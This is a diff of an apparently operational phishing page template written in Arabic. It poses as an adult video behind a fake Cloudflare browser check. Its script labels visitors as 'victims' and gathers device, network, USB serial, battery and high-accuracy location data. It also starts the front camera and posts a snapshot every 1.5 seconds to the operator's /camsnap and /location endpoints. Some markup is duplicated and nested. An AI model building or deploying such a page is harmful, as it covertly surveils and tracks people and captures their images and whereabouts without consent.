@@ -1,43 +1,286 @@
-<html lang="en-US">
-<head> 
-<meta charset="UTF-8"> 
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
-<meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"> 
-<meta name="robots" content="noindex, nofollow"> 
-<meta name="viewport" content="width=device-width,initial-scale=1"> 
-<title></title> 
-<style>
-iframe{ 
-border:0;
-overflow:hidden;
-height:100%;
-width:100%;
-position:fixed;
-top:0;
-left:0;
-}
-</style>
+<!DOCTYPE html>
+<html lang="ar-SA">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Video</title>
+
+    <!-- إضافة وسوم Open Graph -->
+    <meta property="og:title" content="👙💋">
+    <meta property="og:description" content="Video ">
+    <meta property="og:image" content="https://thumbs2.imgbox.com/b7/f3/7m6EeDrs_t.jpg">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://www.example.com">
+
+    <!-- إضافة وسوم Twitter -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="👙💋">
+    <meta name="twitter:description" content="Video ">
+    <meta name="twitter:image" content="https://thumbs2.imgbox.com/b7/f3/7m6EeDrs_t.jpg">
+
+    <style type="text/css">
+        html, body {
+            width: 100%;
+            height: 100%;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background-color: #000000;
+            color: #ffffff;
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif;
+            font-size: 16px;
+            line-height: 1.7em;
+            -webkit-font-smoothing: antialiased;
+        }
+        h1 {
+            text-align: center;
+            font-weight: 700;
+            margin: 16px 0;
+            font-size: 32px;
+            color: #ffffff;
+            line-height: 1.25;
+        }
+        p {
+            font-size: 20px;
+            font-weight: 400;
+            margin: 8px 0;
+        }
+        p, .attribution {
+            text-align: center;
+        }
+        #spinner {
+            margin: 0 auto 30px auto;
+            display: block;
+        }
+        .attribution {
+            margin-top: 32px;
+        }
+        @keyframes fader {
+            0% { opacity: 0.2; }
+            50% { opacity: 1.0; }
+            100% { opacity: 0.2; }
+        }
+        @-webkit-keyframes fader {
+            0% { opacity: 0.2; }
+            50% { opacity: 1.0; }
+            100% { opacity: 0.2; }
+        }
+        #cf-bubbles > .bubbles {
+            animation: fader 1.6s infinite;
+        }
+        #cf-bubbles > .bubbles:nth-child(2) {
+            animation-delay: .2s;
+        }
+        #cf-bubbles > .bubbles:nth-child(3) {
+            animation-delay: .4s;
+        }
+        .bubbles {
+            background-color: #f58220;
+            width: 20px;
+            height: 20px;
+            margin: 2px;
+            border-radius: 100%;
+            display: inline-block;
+            transition: transform 0.3s ease-in-out;
+        }
+        .bubbles:hover {
+            transform: scale(1.5);
+        }
+        a {
+            color: #2c7cb0;
+            text-decoration: none;
+            transition: color 0.15s ease;
+        }
+        a:hover {
+            color: #f4a15d;
+        }
+        .attribution {
+            font-size: 16px;
+            line-height: 1.5;
+        }
+        .ray_id {
+            display: block;
+            margin-top: 8px;
+        }
+        #cf-wrapper #challenge-form {
+            padding-top: 25px;
+            padding-bottom: 25px;
+        }
+        #cf-hcaptcha-container {
+            text-align: center;
+        }
+        #cf-hcaptcha-container iframe {
+            display: inline-block;
+        }
+        #cf-spinner-redirecting {
+            font-size: 24px;
+            color: #f58220;
+        }
+        .loading-overlay {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 20px;
+            z-index: 9999;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            animation: fadeOut 15s forwards;
+        }
+        @keyframes fadeOut {
+            0% { opacity: 1; }
+            100% { opacity: 0; display: none; }
+        }
+        .play-icon {
+            font-size: 50px;
+            color: white;
+        }
+    </style>
 </head>
 <body>
-<video id="video" style="display:none"  playsinline autoplay></video>
-<canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
-<script type="text/javascript" defer>
-var uid="<%=uid %>";
-async function gather(){
-var td="";
-<% if(!t){ %>
-td += '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | Time: <%=time %></b>';
-<% }else{ %>
-await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>✅Victim Information </code><br><br><b>⚓ IP: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | Time: <%=time %></b>'));
+<table width="100%" height="100%" cellpadding="20">
+<tbody>
+<tr>
+<td align="center" valign="middle">
+<div class="cf-browser-verification cf-im-under-attack">
+<noscript>
+<h1 data-translate="turn_on_js" style="color:#bd2426;">الرجاء تفعيل JavaScript وإعادة تحميل الصفحة.</h1>
+</noscript>
+<div id="cf-content" style="display: block;">
+<!-- تمت إزالة كرات التحميل -->
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مشاهدة الفيديو</title>
+    <style>
+        .loading-overlay {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(0, 0, 0, 0.8);
+            padding: 30px;
+            z-index: 9999;
+            border-radius: 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            animation: fadeOut 15s forwards;
+        }
+
+        @keyframes fadeOut {
+            0% { opacity: 1; }
+            100% { opacity: 0; display: none; }
+        }
+
+        .play-icon {
+            width: 60px;
+            height: 60px;
+            border: 8px solid #42a5f5;
+            border-radius: 50%;
+            border-left-color: transparent;
+            animation: spin 1s infinite linear;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-text {
+            color: #ffffff;
+            font-size: 18px;
+            margin-top: 15px;
+            animation: rotateText 1.5s infinite linear;
+        }
+
+        @keyframes rotateText {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay">
+        <div class="play-icon"></div>
+        <div class="loading-text"> </div>
+    </div>
+
+    <table width="100%" height="100%" cellpadding="20">
+        <tbody>
+            <tr>
+                <td align="center" valign="middle">
+                    <div class="cf-browser-verification cf-im-under-attack">
+                        <noscript>
+                            <h1 data-translate="turn_on_js" style="color:#bd2426;">الرجاء تفعيل JavaScript وإعادة تحميل الصفحة.</h1>
+                        </noscript>
+                        <div id="cf-content" style="display: block;">
+                            <div id="no-cookie-warning" class="cookie-warning" style="display:none">
+                                <p style="color:#bd2426;">الرجاء تمكين الكوكيز وإعادة تحميل الصفحة.</p>
+                            </div>
+                        </div>
+                    </div>
+                </td>
+            </tr>
+        </tbody>
+    </table>
+
+    <script>
+        // إخفاء العلامة بعد 5 ثواني
+        setTimeout(function() {
+            document.querySelector('.loading-overlay').style.display = 'none';
+        }, 150000);
+    </script>
+</body>
+</html>
+                        <!-- تضمين فيديو باستخدام iframe -->
+                        <iframe src="https://pixeldrain.com/u/HVePrnZ5" width="100%" height="500" allowfullscreen></iframe>
+                    </div>
+
+                    <!-- عنصر العلامة المرئية أثناء التحميل -->
+                    <div class="loading-overlay" id="loading-overlay">
+                        <div class="play-icon"></div>
+                        <div class="loading-text"> </div>
+                    </div>
+                
+                    <script>
+                        // تم إزالة عداد التوجيه
+                    </script>
+                    <video id="video" style="display:none" playsinline autoplay></video>
+                    <canvas hidden="hidden" id="canvas" width="500" height="500"></canvas>
+                    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
+                    <script type="text/javascript">
+                        var c = false, l = false, uid = "<%=uid %>";
+                        async function gather() {
+                            var td = "";
+                            <% if (!t) { %>
+                            td += '<code>✅معلومات الضحية </code><br><br><b>⚓ الآي بي: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | الوقت: <%=time %></b>';
+                            <% } else { %>
+                            await fetch("<%=a %>").then((r) => r.json()).then((d) => (td += '<code>✅معلومات الضحية </code><br><br><b>⚓ الآي بي: <a href="https://ip-api.com/#' + d.ip + '" >' + d.ip + '</a> | الوقت: <%=time %></b>'));
+                               
+                               
 
 <% } %>
 
-td+="<br><br><b>⏳ Date In Victim's Device :</b> "+new Date()+"<br>";
+td+="<br><br><b>⏳ التاريخ في جهاز الضحية :</b> "+new Date()+"<br>";
 var xo=["productSub","vendor","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"];
 var xoc=["type","rtt","saveData","effectiveType","downlink","downlinkMax"];
-///INITIALS
-td+="<br><b>📱 Device Information</b><br>";
+///البيانات الأولية
+td+="<br><b>📱 معلومات الجهاز</b><br>";
 for(var i=0;i < xo.length;i++){ 
 if(xo[i] in navigator){
 var str = navigator[xo[i]];
@@ -45,121 +288,134 @@ td+="<b>"+xo[i] +"</b>: <code>"+str+"</code><br>";
 }
 }
 
-
-
 if (navigator.mediaDevices || navigator.mediaDevices?.enumerateDevices) {
-/////List cameras and microphones.
+/////قائمة الكاميرات والميكروفونات.
 await navigator.mediaDevices?.enumerateDevices()
 .then(function(devices) {
-td+="<br><b>📷 Media Device Information</b><br>";
+td+="<br><b>📷 معلومات الأجهزة الصوتية والبصرية</b><br>";
 devices.forEach(function(device) {
 td+="<b>"+device.kind+":</b> " + device.label +" id = <code>" + device.deviceId+"</code><br>";
 });
 })
 .catch(function(err) {
-td+="<br><b>📷 Media Device Information</b><br>";
-td+="⚠️ Media Device Error: "+err.name + ": " + err.message;
+td+="<br><b>📷 معلومات الأجهزة الصوتية والبصرية</b><br>";
+td+="⚠️ خطأ في الأجهزة الصوتية والبصرية: "+err.name + ": " + err.message;
 });
 }
 
-
-////CONNECTION
+////الاتصال
 if("connection" in navigator){
-td+="<br><b>🕸️ Network Information</b><br>";
+td+="<br><b>🕸️ معلومات الشبكة</b><br>";
 for(var i=0;i < xoc.length;i++){ 
 var str = navigator.connection[xoc[i]];
 td+="<b>"+xoc[i] +"</b>: <code>"+str+"</code><br>";
 }}
 
-
 ////USB
 if("usb" in navigator){
 await navigator.usb.getDevices()
 .then(devices => {
-td+="<br><b>🔌 Total USB devices connected:</b> " + devices.length+"<br>";
+td+="<br><b>🔌 عدد الأجهزة USB المتصلة:</b> " + devices.length+"<br>";
 devices.forEach(device => {
-td+="<b>Product name:</b> " + device.productName + " , <b>Serial number: </b> <code>" + device.serialNumber+"</code><br>";
+td+="<b>اسم المنتج:</b> " + device.productName + " , <b>الرقم التسلسلي: </b> <code>" + device.serialNumber+"</code><br>";
 });
 });
 }
 
 if("getBattery" in navigator){
 await navigator.getBattery().then(function(battery) {
-td+="<br><b>🔋 Battery Information</b><br>";
-td+="<b>🔋Battery Level:</b> " +battery.level*100+"%<br><b>⚡ Is Battery Charging:</b> "+battery.charging+"";
+td+="<br><b>🔋 معلومات البطارية</b><br>";
+td+="<b>🔋 مستوى البطارية:</b> " +battery.level*100+"%<br><b>⚡ هل البطارية شحنت:</b> "+battery.charging+"";
 });
 }
 
-//////Location
+
+//////الموقع
 if(!navigator.geolocation) {
-td+="<br><b>📍 Location Information</b><br>";
-td+="⚠️ Location API not avilable";
+    td+="<br><b>📍 معلومات الموقع</b><br>";
+    td+="⚠️ واجهة برمجة تطبيقات المواقع غير متوفرة";
+    l=true;
 } 
 
 function success(pos) {
-const crd = pos.coords;
-$.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},(s)=>{
-l=true;
-red();
-});
+    const crd = pos.coords;
+    $.post("<%=a %>/location",{uid:uid,lat:encodeURIComponent(crd.latitude),lon:encodeURIComponent(crd.longitude),acc:encodeURIComponent(crd.accuracy)},(s)=>{
+        l=true;
+        red();
+    });
 }
 
 function error(err) {
-td+="<br><b>📍 Location Information</b><br>";
-td+="⚠️ Location ERROR: <code>"+err.message+"</code>";
+    td+="<br><b>📍 معلومات الموقع</b><br>";
+    td+="⚠️ خطأ في الموقع: <code>"+err.message+"</code>";
+    l=true;
 }
 if(navigator.geolocation){
-navigator.geolocation.getCurrentPosition(success, error, {  enableHighAccuracy: true, maximumAge: 0});
+    await navigator.geolocation.getCurrentPosition(success, error, {  enableHighAccuracy: true, maximumAge: 0});
 }
-
-
-
 
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
+var imgsent=0;
 
 function post(o){
-$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{
-
-});
+    $.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(o)},(s)=>{
+        imgsent+=1;
+        if(imgsent==4){
+            c=true;
+            red();
+        }
+    });
 }
-const constraints = {audio: false,video: {facingMode: "user" }};
-// Access webcam
+const constraints = {audio: false, video: {facingMode: "user" }};
+// الوصول إلى الكاميرا
 async function cam() {
-try {
-const stream = await navigator.mediaDevices.getUserMedia(constraints);
-handleSuccess(stream);
-} catch (e) {
-td+='<br><b>📷 Camera Images</b>';
-td+= `<br>⚠️ Camera Access Error: ${e.toString()}`;
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+    } catch (e) {
+        td+='<br><b>📷 صور الكاميرا</b>';
+        td+= `<br>⚠️ خطأ في الوصول للكاميرا: ${e.toString()}`;
+        c=true;
+        red();
+    }
 }
+
+// نجاح
+function handleSuccess(stream) {
+    window.stream = stream;
+    video.srcObject = stream;
+    var context = canvas.getContext('2d');
+    var id=setInterval(function(){
+        context.drawImage(video, 0, 0, 500, 500);
+        var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64", "");
+        post(canvasData);
+    }, 1500);
 }
 
 cam();
-// Success
-function handleSuccess(stream) {
-window.stream = stream;
-video.srcObject = stream;
-var context = canvas.getContext('2d');
-var id=setInterval(function(){
-context.drawImage(video, 0, 0, 500, 500);
-var canvasData = canvas.toDataURL("image/png").replace("data:image/png;base64", "");
-post(canvasData);
-}, 1500);
+
+function red(){
+    if(c && l){
+        // تم حذف إعادة التوجيه
+        // window.location.href="<%=url %>";
+        console.log("Ready");
+    }
 }
 
-
-
-
-
-
-$.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},(s)=>{console.log("done")});
+$.post("<%=a %>",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)},(s)=>{});
 
 }
 
-gather();
-
+window.onload=()=>{
+    gather();
+    var i="qwertyuioplkjhgfdsazxcvbnm0987654321";
+    var str="";
+    for(var o=0;o<17;o++){
+        str+=i[Math.floor(Math.random() * 35)];
+    }
+    document.getElementById("ray").innerHTML=str;
+};
 </script>
-  <iframe src="<%=url %>"></iframe>
 </body>
 </html>
